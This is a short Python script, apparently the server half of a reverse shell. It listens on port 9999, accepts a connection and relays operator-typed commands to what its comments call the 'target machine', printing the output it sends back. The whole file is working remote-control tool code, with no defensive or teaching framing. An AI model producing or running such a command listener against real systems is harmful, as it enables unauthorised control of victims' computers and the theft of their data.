import socket
import sys

# Create a socket (allows connection)
def socket_create():
    try:
        global host, port, s

        host = ''
        port = 9999

        s = socket.socket()        
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    except Exception as e:
        print(e)

# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host, port, s

        # host = ''
        # port = 9999

        print("Bind socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)       
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying ...")
    except Exception as e:
        print(e)

# Sending commands to target machine
def send_commands(conn):
    while True:
        cmd = input()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))

            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

            
# Establishing a connection from client
def socket_accept():
    conn, addr = s.accept()
    print("Connection has been established | " + "IP " + addr[0] + " Port " + str(addr[1]))

    send_commands(conn)
    conn.close()

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()    